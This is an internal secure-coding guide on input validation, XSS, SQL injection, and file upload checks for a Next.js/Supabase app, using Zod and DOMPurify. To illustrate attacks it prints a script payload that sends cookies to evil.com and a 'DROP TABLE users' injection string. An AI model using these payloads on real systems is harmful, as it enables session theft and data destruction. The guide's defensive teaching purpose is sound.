# Input Validation & Sanitization

*How we protect against malicious input at Friends Innovation Lab.*

---

## Golden Rules

1. **Never trust user input** — Validate everything, always
2. **Validate on the server** — Client validation is UX, not security
3. **Sanitize for context** — Different outputs need different sanitization
4. **Fail closed** — Reject invalid input, don't try to fix it

---

## Validation with Zod

We use **Zod** for runtime validation. It's TypeScript-native and works on both client and server.

### Basic Validation

```typescript
import { z } from 'zod'

// Define schema
const userSchema = z.object({
  name: z.string().min(1).max(100),
  email: z.string().email(),
  age: z.number().int().positive().optional(),
})

// Validate
const result = userSchema.safeParse(input)

if (!result.success) {
  // Handle validation errors
  console.error(result.error.flatten())
  return
}

// result.data is typed and validated
const user = result.data
```

### Common Patterns

```typescript
// Strings
z.string()                          // Any string
z.string().min(1)                   // Non-empty
z.string().max(100)                 // Max length
z.string().email()                  // Email format
z.string().url()                    // URL format
z.string().uuid()                   // UUID format
z.string().regex(/^[a-z]+$/)        // Custom pattern
z.string().trim()                   // Trim whitespace

// Numbers
z.number()                          // Any number
z.number().int()                    // Integer only
z.number().positive()               // > 0
z.number().nonnegative()            // >= 0
z.number().min(0).max(100)          // Range

// Enums
z.enum(['admin', 'user', 'guest'])  // Specific values
z.literal('active')                 // Exact value

// Arrays
z.array(z.string())                 // Array of strings
z.array(z.string()).min(1)          // Non-empty array
z.array(z.string()).max(10)         // Max 10 items

// Objects
z.object({
  name: z.string(),
  email: z.string().email(),
})

// Optional / Nullable
z.string().optional()               // string | undefined
z.string().nullable()               // string | null
z.string().nullish()                // string | null | undefined

// Default values
z.string().default('guest')
z.number().default(0)

// Transform
z.string().transform(s => s.toLowerCase())
z.string().trim().toLowerCase()     // Built-in
```

### API Route Validation

```typescript
// lib/validations/user.ts
import { z } from 'zod'

export const createUserSchema = z.object({
  name: z.string()
    .min(1, 'Name is required')
    .max(100, 'Name too long'),
  email: z.string()
    .email('Invalid email address'),
  role: z.enum(['admin', 'user', 'guest'])
    .default('user'),
})

export type CreateUserInput = z.infer<typeof createUserSchema>
```

```typescript
// app/api/users/route.ts
import { NextResponse } from 'next/server'
import { createUserSchema } from '@/lib/validations/user'

export async function POST(request: Request) {
  // Parse body
  let body
  try {
    body = await request.json()
  } catch {
    return NextResponse.json(
      { error: 'Invalid JSON' },
      { status: 400 }
    )
  }

  // Validate
  const result = createUserSchema.safeParse(body)

  if (!result.success) {
    return NextResponse.json(
      { error: 'Validation failed', details: result.error.flatten() },
      { status: 400 }
    )
  }

  // result.data is now safe to use
  const user = await createUser(result.data)

  return NextResponse.json(user, { status: 201 })
}
```

### Form Validation (Client + Server)

```typescript
// Same schema works on both sides
// lib/validations/contact.ts
import { z } from 'zod'

export const contactSchema = z.object({
  name: z.string().min(1, 'Name is required'),
  email: z.string().email('Invalid email'),
  message: z.string()
    .min(10, 'Message must be at least 10 characters')
    .max(1000, 'Message too long'),
})
```

```typescript
// Client-side with react-hook-form
'use client'

import { useForm } from 'react-hook-form'
import { zodResolver } from '@hookform/resolvers/zod'
import { contactSchema } from '@/lib/validations/contact'

export function ContactForm() {
  const form = useForm({
    resolver: zodResolver(contactSchema),
    defaultValues: {
      name: '',
      email: '',
      message: '',
    },
  })

  const onSubmit = async (data) => {
    // data is already validated
    await fetch('/api/contact', {
      method: 'POST',
      body: JSON.stringify(data),
    })
  }

  return (
    <form onSubmit={form.handleSubmit(onSubmit)}>
      {/* form fields */}
    </form>
  )
}
```

---

## XSS Prevention

### How XSS Works

Attacker injects malicious script:
```html
<!-- User submits this as their "name" -->
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
```

If rendered without sanitization:
```html
<p>Hello, <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script></p>
```

### React's Built-in Protection

React escapes content by default:

```tsx
// ✅ Safe - React escapes this
const name = '<script>alert("xss")</script>'
return <p>Hello, {name}</p>
// Renders: Hello, &lt;script&gt;alert("xss")&lt;/script&gt;
```

### Dangerous Patterns

```tsx
// ❌ DANGER - dangerouslySetInnerHTML bypasses protection
<div dangerouslySetInnerHTML={{ __html: userContent }} />

// ❌ DANGER - href with user input
<a href={userInput}>Click</a>  // Could be javascript:alert('xss')

// ❌ DANGER - eval with user input
eval(userInput)

// ❌ DANGER - URL from user input
window.location.href = userInput
```

### Safe Patterns

```tsx
// ✅ Safe - React escapes automatically
<p>{userContent}</p>

// ✅ Safe - Validate URL scheme
const isValidUrl = (url: string) => {
  try {
    const parsed = new URL(url)
    return ['http:', 'https:'].includes(parsed.protocol)
  } catch {
    return false
  }
}

<a href={isValidUrl(userUrl) ? userUrl : '#'}>Link</a>

// ✅ Safe - Use allowlist for dynamic content
const allowedTags = ['b', 'i', 'em', 'strong']
// Use a sanitization library like DOMPurify
```

### If You Must Render HTML

Use **DOMPurify**:

```bash
npm install dompurify
npm install -D @types/dompurify
```

```tsx
import DOMPurify from 'dompurify'

function RichContent({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href'],
  })

  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}
```

---

## SQL Injection Prevention

### How SQL Injection Works

Attacker submits:
```
'; DROP TABLE users; --
```

Unsafe code:
```typescript
// ❌ NEVER DO THIS
const query = `SELECT * FROM users WHERE id = '${userId}'`
// Becomes: SELECT * FROM users WHERE id = ''; DROP TABLE users; --'
```

### Supabase Protection

Supabase client uses parameterized queries automatically:

```typescript
// ✅ Safe - Supabase handles escaping
const { data } = await supabase
  .from('users')
  .select('*')
  .eq('id', userId)  // userId is parameterized

// ✅ Safe - Even with user input
const { data } = await supabase
  .from('posts')
  .select('*')
  .ilike('title', `%${searchTerm}%`)  // Escaped properly
```

### Raw SQL (If Ever Needed)

```typescript
// ✅ Safe - Use parameterized queries
const { data } = await supabase.rpc('search_posts', {
  search_term: userInput  // Passed as parameter
})

// In your SQL function:
CREATE FUNCTION search_posts(search_term text)
RETURNS SETOF posts AS $
  SELECT * FROM posts WHERE title ILIKE '%' || search_term || '%'
$ LANGUAGE sql;
```

---

## URL Parameter Validation

### Validate Route Parameters

```typescript
// app/api/users/[id]/route.ts
import { z } from 'zod'

const paramsSchema = z.object({
  id: z.string().uuid(),
})

export async function GET(
  request: Request,
  { params }: { params: { id: string } }
) {
  const result = paramsSchema.safeParse(params)

  if (!result.success) {
    return NextResponse.json(
      { error: 'Invalid user ID' },
      { status: 400 }
    )
  }

  // Safe to use
  const user = await getUser(result.data.id)
}
```

### Validate Query Parameters

```typescript
// app/api/search/route.ts
import { z } from 'zod'

const querySchema = z.object({
  q: z.string().min(1).max(100),
  page: z.coerce.number().int().positive().default(1),
  limit: z.coerce.number().int().min(1).max(100).default(10),
})

export async function GET(request: Request) {
  const { searchParams } = new URL(request.url)

  const result = querySchema.safeParse({
    q: searchParams.get('q'),
    page: searchParams.get('page'),
    limit: searchParams.get('limit'),
  })

  if (!result.success) {
    return NextResponse.json(
      { error: 'Invalid parameters' },
      { status: 400 }
    )
  }

  const { q, page, limit } = result.data
  // Safe to use
}
```

---

## File Upload Validation

### Validate File Type

```typescript
const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/webp']
const MAX_SIZE = 5 * 1024 * 1024 // 5MB

export async function POST(request: Request) {
  const formData = await request.formData()
  const file = formData.get('file') as File

  if (!file) {
    return NextResponse.json({ error: 'No file' }, { status: 400 })
  }

  // Check type
  if (!ALLOWED_TYPES.includes(file.type)) {
    return NextResponse.json(
      { error: 'Invalid file type. Allowed: JPEG, PNG, WebP' },
      { status: 400 }
    )
  }

  // Check size
  if (file.size > MAX_SIZE) {
    return NextResponse.json(
      { error: 'File too large. Max 5MB' },
      { status: 400 }
    )
  }

  // Also verify content (don't trust Content-Type header alone)
  const buffer = await file.arrayBuffer()
  const header = new Uint8Array(buffer.slice(0, 4))

  if (!isValidImageHeader(header)) {
    return NextResponse.json(
      { error: 'Invalid file content' },
      { status: 400 }
    )
  }

  // Safe to process
}

function isValidImageHeader(header: Uint8Array): boolean {
  // JPEG: FF D8 FF
  if (header[0] === 0xFF && header[1] === 0xD8 && header[2] === 0xFF) {
    return true
  }
  // PNG: 89 50 4E 47
  if (header[0] === 0x89 && header[1] === 0x50 && header[2] === 0x4E && header[3] === 0x47) {
    return true
  }
  // WebP: 52 49 46 46 (RIFF)
  if (header[0] === 0x52 && header[1] === 0x49 && header[2] === 0x46 && header[3] === 0x46) {
    return true
  }
  return false
}
```

### Sanitize Filenames

```typescript
function sanitizeFilename(filename: string): string {
  return filename
    .replace(/[^a-zA-Z0-9.-]/g, '_')  // Replace unsafe chars
    .replace(/\.{2,}/g, '.')           // No double dots
    .substring(0, 100)                  // Limit length
}

// Usage
const safeFilename = sanitizeFilename(file.name)
const path = `uploads/${userId}/${safeFilename}`
```

---

## Validation Error Messages

### User-Friendly Errors

```typescript
const schema = z.object({
  email: z.string()
    .min(1, 'Email is required')
    .email('Please enter a valid email address'),
  password: z.string()
    .min(8, 'Password must be at least 8 characters')
    .regex(/[A-Z]/, 'Password must contain an uppercase letter')
    .regex(/[0-9]/, 'Password must contain a number'),
})
```

### Don't Reveal System Details

```typescript
// ❌ Too much information
{ error: 'User with email john@example.com already exists in table users' }

// ✅ Generic message
{ error: 'An account with this email already exists' }

// ❌ Reveals valid usernames
{ error: 'Invalid password for user admin' }

// ✅ Generic message
{ error: 'Invalid email or password' }
```

---

## Common Mistakes

| Mistake | Risk | Fix |
|---------|------|-----|
| Client-only validation | Bypassed easily | Always validate on server |
| Trusting Content-Type | Spoofed headers | Check file content |
| Detailed error messages | Information disclosure | Generic messages |
| No length limits | DoS via large input | Set max lengths |
| Allowing all HTML | XSS attacks | Sanitize or escape |
| String concatenation in SQL | SQL injection | Use parameterized queries |

---

## Checklist

### Every API Endpoint

- [ ] Request body validated with Zod
- [ ] URL parameters validated
- [ ] Query parameters validated
- [ ] File uploads checked (type, size, content)
- [ ] Errors don't reveal system details

### Every Form

- [ ] Client-side validation (UX)
- [ ] Server-side validation (security)
- [ ] Clear error messages
- [ ] Input length limits

### Every User-Generated Content

- [ ] Escaped when rendered (React default)
- [ ] Sanitized if HTML is needed (DOMPurify)
- [ ] URLs validated before use

---

*See also: [Secrets Management](secrets.md) · [Compliance](compliance.md)*
